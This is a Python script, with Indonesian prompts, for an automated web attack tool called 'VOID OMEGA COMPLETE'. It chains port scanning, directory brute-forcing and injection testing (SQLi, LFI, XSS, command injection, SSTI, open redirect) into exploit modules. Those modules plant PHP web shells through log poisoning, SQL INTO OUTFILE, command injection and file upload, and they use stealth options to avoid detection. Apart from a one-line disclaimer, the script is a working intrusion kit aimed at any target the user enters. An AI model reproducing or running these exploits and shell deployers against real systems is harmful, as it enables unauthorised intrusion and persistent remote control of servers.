#!/usr/bin/env python3
"""
VOID OMEGA COMPLETE v3.0 - Ultimate Web Security Suite
Recon + Scanner + Exploiter + WebShell Deployer
HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI
"""

import os
import sys
import re
import time
import json
import socket
import random
import base64
import urllib.parse
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except:
    os.system("pip install requests")
    import requests

# ========================================
# KONFIGURASI GLOBAL
# ========================================
VERSION = "3.0"
TIMEOUT = 8
MAX_THREADS = 30
VERBOSE = False
STEALTH = True

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
]

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]

COMMON_DIRS = [
    "admin", "login", "uploads", "backup", "tmp", "logs", "phpmyadmin", "wp-admin",
    "wp-content", "api", "css", "js", "images", "files", "download", "data",
    "config", "includes", "modules", "plugins", "themes", "vendor", "lib", "inc",
    "assets", "static", "media", "cgi-bin", "shell", "cmd", "test", "phpinfo",
    "info", "dashboard", "panel", "cpanel", "index.php", "index.html", "robots.txt",
    "sitemap.xml", "crossdomain.xml", "phpinfo.php", ".htaccess", "web.config",
    "error_log", "README.md", "composer.json", "package.json", "wp-config.php",
    "config.php", "database.php", "db.php", "backup.sql", "dump.sql", "adminer.php"
]

PAYLOADS = {
    "sqli": ["'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "' AND SLEEP(3)--"],
    "lfi": ["../../../etc/passwd", "../../../../etc/passwd", "../../../../windows/win.ini", "c:/windows/win.ini"],
    "xss": ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "\"><script>alert('XSS')</script>"],
    "cmd": ["; id", "| id", "& id", "&& whoami", "|| whoami", "; ipconfig", "| ipconfig"],
    "ssti": ["{{7*7}}", "${7*7}", "{{7*'7'}}"],
    "redirect": ["http://example.com", "//example.com", "//evil.com"]
}

# ========================================
# UTILITY
# ========================================
def print_banner():
    print("""
   ╔═══════════════════════════════════════════════════════╗
   ║     V O I D   O M E G A   C O M P L E T E   v3.0    ║
   ║   Recon + Scanner + Exploiter + WebShell Deployer    ║
   ╚═══════════════════════════════════════════════════════╝
    """)

def get_session():
    s = requests.Session()
    s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    if STEALTH:
        s.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        })
    return s

def safe_request(url, method="GET", params=None, data=None, files=None, allow_redirects=True, timeout=TIMEOUT):
    try:
        s = get_session()
        if method.upper() == "GET":
            r = s.get(url, params=params, timeout=timeout, allow_redirects=allow_redirects)
        else:
            r = s.post(url, data=data, files=files, timeout=timeout, allow_redirects=allow_redirects)
        if STEALTH:
            time.sleep(random.uniform(0.2, 0.8))
        return r
    except Exception as e:
        if VERBOSE: print(f"  [!] Request error: {e}")
        return None

def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except:
        return None

def check_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except:
        return False

def to_serializable(obj):
    if isinstance(obj, set):
        return list(obj)
    if isinstance(obj, dict):
        return {k: to_serializable(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [to_serializable(i) for i in obj]
    return obj

# ========================================
# RECONNAISSANCE
# ========================================
def recon(target):
    print(f"\n\033[1;33m[+] RECONNAISSANCE: {target}\033[0m")
    result = {"target": target, "ip": None, "ports": [], "server": "Unknown", "technologies": []}
    ip = resolve_domain(target)
    result["ip"] = ip
    print(f"  IP Address: {ip if ip else 'Gagal resolve'}")
    if ip:
        print("  Scanning common ports...")
        open_ports = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_port, ip, port): port for port in COMMON_PORTS}
            for future in as_completed(futures):
                port = futures[future]
                if future.result():
                    open_ports.append(port)
        result["ports"] = open_ports
        print(f"  Open ports: {', '.join(map(str, open_ports)) if open_ports else 'None'}")
    for proto in ["https", "http"]:
        try:
            r = safe_request(f"{proto}://{target}", timeout=5)
            if r:
                result["server"] = r.headers.get("Server", "Unknown")
                print(f"  Server: {result['server']}")
                print(f"  X-Powered-By: {r.headers.get('X-Powered-By', 'Unknown')}")
                techs = []
                if "wp-content" in r.text.lower(): techs.append("WordPress")
                if "joomla" in r.text.lower(): techs.append("Joomla")
                if "drupal" in r.text.lower(): techs.append("Drupal")
                if "laravel" in r.text.lower(): techs.append("Laravel")
                if techs:
                    result["technologies"] = techs
                    print(f"  Technologies: {', '.join(techs)}")
                break
        except:
            continue
    return result

# ========================================
# DIRECTORY SCAN
# ========================================
def dir_scan(target, proto):
    print(f"\n\033[1;33m[+] DIRECTORY & FILE SCANNING\033[0m")
    base = f"{proto}://{target}"
    found = []
    def check(path):
        url = urljoin(base, path)
        r = safe_request(url, timeout=3)
        if r and r.status_code in [200, 403, 401]:
            return {"url": url, "status": r.status_code}
        return None
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check, p): p for p in COMMON_DIRS}
        for future in as_completed(futures):
            res = future.result()
            if res:
                print(f"  [+] Found: {res['url']} ({res['status']})")
                found.append(res)
    return found

# ========================================
# PARAMETER DISCOVERY
# ========================================
def discover_params(target, proto):
    print(f"\n\033[1;33m[+] DISCOVERING PARAMETERS\033[0m")
    base = f"{proto}://{target}"
    params = set()
    r = safe_request(base)
    if r:
        matches = re.findall(r'\?([a-zA-Z0-9_]+)=', r.text)
        params.update(matches)
        form_matches = re.findall(r'<input.*?name=["\']([^"\']+)["\']', r.text)
        params.update(form_matches)
    if not params:
        params = {"id", "page", "file", "q", "s", "view", "action", "cat", "product", "dir", "exec", "query", "search", "system", "path", "cmd"}
    get_params = [p for p in params if not p.startswith("_")]
    print(f"  Found parameters: GET({len(get_params)}) POST(0)")
    return {"GET": get_params, "POST": []}

# ========================================
# VULNERABILITY SCANNER
# ========================================
def test_vuln(target, proto, params, vuln_type, payloads, indicators):
    print(f"\n\033[1;33m[+] TESTING {vuln_type.upper()}\033[0m")
    base = f"{proto}://{target}"
    findings = []
    for param in params["GET"]:
        for payload in payloads:
            url = f"{base}?{param}={quote_plus(payload)}"
            r = safe_request(url)
            if r:
                for ind in indicators:
                    if ind in r.text:
                        findings.append({"param": param, "payload": payload})
                        print(f"  [✓] {vuln_type} found: {param} with {payload[:20]}...")
                        break
                if findings:
                    break
    if not findings:
        print(f"  [✗] No {vuln_type} found")
    return findings

# ========================================
# EXPLOITER MODULES
# ========================================
def exploit_lfi(target, proto, params):
    print(f"\n\033[1;33m[+] EXPLOIT LFI + LOG POISONING\033[0m")
    base = f"{proto}://{target}"
    for p in params["GET"]:
        for payload in ["../../../etc/passwd", "../../../../windows/win.ini"]:
            url = f"{base}?{p}={quote_plus(payload)}"
            r = safe_request(url)
            if r and ("root:" in r.text or "[extensions]" in r.text):
                print(f"  [✓] LFI confirmed on '{p}' with {payload}")
                log_path = "../../../../inetpub/logs/LogFiles/W3SVC1/u_ex" + datetime.now().strftime("%y%m%d") + ".log"
                # Inject via User-Agent
                headers = {"User-Agent": "<?php system($_GET['cmd']); ?>"}
                try:
                    requests.get(f"{base}?{p}=test", headers=headers, timeout=5)
                    print(f"  [✓] Log poisoning injected! Access: {base}?{p}={quote_plus(log_path)}&cmd=whoami")
                    return {"param": p, "log_path": log_path}
                except:
                    pass
    print("  [✗] LFI exploit failed")
    return None

def exploit_upload(target, proto):
    print(f"\n\033[1;33m[+] EXPLOIT UPLOAD\033[0m")
    base = f"{proto}://{target}"
    upload_paths = ["/upload", "/uploads", "/fileupload", "/upload.php", "/upload.aspx", "/admin/upload", "/api/upload"]
    for path in upload_paths:
        url = urljoin(base, path)
        r = safe_request(url)
        if r and r.status_code in [200, 403]:
            print(f"  [✓] Upload endpoint: {url}")
            shell_code = '<% response.write("TEST") %>' if ".aspx" in path else '<?php echo "TEST"; ?>'
            files = {'file': ('shell.aspx' if ".aspx" in path else 'shell.php', shell_code, 'application/octet-stream')}
            r2 = safe_request(url, method="POST", files=files)
            if r2 and "TEST" in r2.text:
                print(f"  [✓] Shell uploaded! Access: {url}")
                return {"url": url}
    print("  [✗] Upload exploit failed")
    return None

def exploit_sqli(target, proto, params):
    print(f"\n\033[1;33m[+] EXPLOIT SQLi + OS-SHELL\033[0m")
    base = f"{proto}://{target}"
    for p in params["GET"]:
        for payload in ["' OR '1'='1", "' UNION SELECT NULL--"]:
            url = f"{base}?{p}={quote_plus(payload)}"
            r = safe_request(url)
            if r and ("SQL" in r.text or "mysql" in r.text):
                print(f"  [✓] SQLi confirmed on '{p}'")
                shell_payload = " UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'--"
                url2 = f"{base}?{p}={quote_plus(shell_payload)}"
                r2 = safe_request(url2)
                if r2 and r2.status_code == 200:
                    print(f"  [✓] Shell written via SQLi! Access: {base}/shell.php?cmd=whoami")
                    return {"param": p, "shell": "C:/inetpub/wwwroot/shell.php"}
                break
    print("  [✗] SQLi exploit failed")
    return None

def exploit_rce(target, proto, params):
    print(f"\n\033[1;33m[+] EXPLOIT RCE DIRECT\033[0m")
    base = f"{proto}://{target}"
    for p in params["GET"]:
        for payload in ["; whoami", "| whoami", "& whoami"]:
            url = f"{base}?{p}={quote_plus(payload)}"
            r = safe_request(url)
            if r and ("uid=" in r.text or "user" in r.text.lower()):
                print(f"  [✓] RCE confirmed on '{p}' with {payload}")
                shell_cmd = "echo <?php system($_GET[cmd]); ?> > C:\\inetpub\\wwwroot\\shell.php"
                url2 = f"{base}?{p}={quote_plus(shell_cmd)}"
                r2 = safe_request(url2)
                if r2 and r2.status_code == 200:
                    print(f"  [✓] Shell deployed! Access: {base}/shell.php?cmd=whoami")
                    return {"param": p, "shell": "C:/inetpub/wwwroot/shell.php"}
                break
    print("  [✗] RCE exploit failed")
    return None

# ========================================
# MAIN FLOW
# ========================================
def run_full(target, proto):
    print("\n" + "="*60)
    print(f"\033[1;36m[+] VOID OMEGA COMPLETE – Target: {target}\033[0m")
    print("="*60)

    results = {}
    results["recon"] = recon(target)
    results["dirs"] = dir_scan(target, proto)
    results["params"] = discover_params(target, proto)
    params = results["params"]

    # Vulnerability Scanner
    results["sqli"] = test_vuln(target, proto, params, "SQLi", PAYLOADS["sqli"], ["SQL", "mysql", "syntax"])
    results["lfi"] = test_vuln(target, proto, params, "LFI", PAYLOADS["lfi"], ["root:", "[extensions]"])
    results["xss"] = test_vuln(target, proto, params, "XSS", PAYLOADS["xss"], ["<script>", "alert"])
    results["cmd"] = test_vuln(target, proto, params, "CMD", PAYLOADS["cmd"], ["uid=", "user", "ipconfig"])
    results["ssti"] = test_vuln(target, proto, params, "SSTI", PAYLOADS["ssti"], ["49"])
    results["redirect"] = test_vuln(target, proto, params, "Open Redirect", PAYLOADS["redirect"], ["example.com"])

    # Exploiter
    print("\n" + "="*60)
    print("\033[1;33m[+] EXPLOITATION PHASE\033[0m")
    print("="*60)
    exploit_results = {
        "lfi": exploit_lfi(target, proto, params),
        "upload": exploit_upload(target, proto),
        "sqli": exploit_sqli(target, proto, params),
        "rce": exploit_rce(target, proto, params)
    }

    # Report
    print("\n" + "="*60)
    print("\033[1;33m[LAPORAN AKHIR]\033[0m")
    print("="*60)
    print(f"  Target: {target}")
    print(f"  IP: {results['recon'].get('ip', 'N/A')}")
    print(f"  Server: {results['recon'].get('server', 'Unknown')}")
    print(f"  Open Ports: {', '.join(map(str, results['recon'].get('ports', []))) or 'None'}")
    print("-"*60)
    print("  [VULNERABILITIES FOUND]")
    for vuln in ["sqli", "lfi", "xss", "cmd", "ssti", "redirect"]:
        data = results.get(vuln, [])
        status = f"\033[1;32m{len(data)} found\033[0m" if data else "\033[1;31mNone\033[0m"
        print(f"    {vuln.upper()}: {status}")
    print("-"*60)
    print("  [EXPLOIT RESULTS]")
    for k, v in exploit_results.items():
        if v:
            print(f"    \033[1;32m[✓] {k.upper()}: {v}\033[0m")
        else:
            print(f"    \033[1;31m[✗] {k.upper()}: Failed\033[0m")
    print("="*60)
    if any(exploit_results.values()):
        print("\033[1;32m[!] Ada celah yang berhasil dieksploitasi! Coba akses shell.\033[0m")
    else:
        print("\033[1;31m[!] Tidak ada celah yang berhasil dieksploitasi. Mungkin WAF aktif.\033[0m")

    # Save report
    filename = f"report_{target}_{int(time.time())}.json"
    full_report = {
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "recon": results["recon"],
        "directories": results["dirs"],
        "parameters": results["params"],
        "vulnerabilities": {
            "sqli": results["sqli"],
            "lfi": results["lfi"],
            "xss": results["xss"],
            "cmd": results["cmd"],
            "ssti": results["ssti"],
            "redirect": results["redirect"]
        },
        "exploits": exploit_results
    }
    with open(filename, "w") as f:
        json.dump(to_serializable(full_report), f, indent=2)
    print(f"\n[✓] Report saved to {filename}")

# ========================================
# MAIN
# ========================================
def main():
    global VERBOSE, STEALTH, MAX_THREADS
    os.system('clear' if os.name != 'nt' else 'cls')
    print_banner()
    print("\033[1;33m[!] HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI\033[0m")
    print(f"Version: {VERSION}\n")

    if len(sys.argv) < 2:
        target = input("\033[1;36m[?] Masukkan target (domain/IP): \033[0m").strip()
    else:
        target = sys.argv[1]
    if not target:
        print("[!] Target kosong.")
        return

    proto = "https" if input("[?] Gunakan HTTPS? (y/n): ").lower() == 'y' else "http"
    try:
        MAX_THREADS = int(input("[?] Jumlah thread (default 30): ") or 30)
    except:
        MAX_THREADS = 30
    STEALTH = input("[?] Mode Stealth? (y/n): ").lower() == 'y'
    VERBOSE = input("[?] Tampilkan error? (y/n): ").lower() == 'y'

    print(f"\n[+] Target: {proto}://{target}")
    print(f"[+] Threads: {MAX_THREADS}")
    print(f"[+] Stealth: {'ON' if STEALTH else 'OFF'}")
    input("Tekan Enter untuk memulai...")

    run_full(target, proto)

    print("\n[+] Selesai.")
    input("Tekan Enter untuk keluar...")

if __name__ == "__main__":
    main()
